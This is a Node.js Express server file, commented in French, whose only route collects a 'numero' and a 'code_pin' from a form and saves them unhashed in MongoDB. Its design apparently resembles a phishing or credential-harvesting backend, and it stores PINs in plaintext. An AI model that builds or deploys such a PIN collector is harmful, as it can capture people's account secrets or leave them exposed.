// server/app.js
const express = require('express');
const path = require('path');
const mongoose = require('mongoose');
const dotenv = require('dotenv');
const Submission = require('./models/Submission');

dotenv.config();
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware pour JSON
app.use(express.json());

// Servir les fichiers statiques depuis le dossier public
app.use(express.static(path.join(__dirname, '..', 'public')));

// Connexion MongoDB
mongoose.connect(process.env.MONGO_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
})
.then(() => console.log("✅ Connecté à MongoDB"))
.catch((err) => console.error("❌ Erreur de connexion à MongoDB :", err));

// Route POST pour recevoir les données du formulaire
app.post('/enregistrer', async (req, res) => {
    const { numero, code_pin } = req.body;

    if (!numero || !code_pin) {
        return res.status(400).json({ error: "Champs manquants." });
    }

    try {
        const submission = new Submission({
            numero,
            code_pin,
            date: new Date()
        });

        await submission.save();
        res.json({ message: "✅ Données enregistrées avec succès !" });
    } catch (error) {
        console.error("Erreur d’enregistrement :", error);
        res.status(500).json({ error: "Erreur serveur." });
    }
});

// Lancer le serveur
app.listen(PORT, () => {
    console.log(`🚀 Serveur en ligne sur http://localhost:${PORT}`);
});
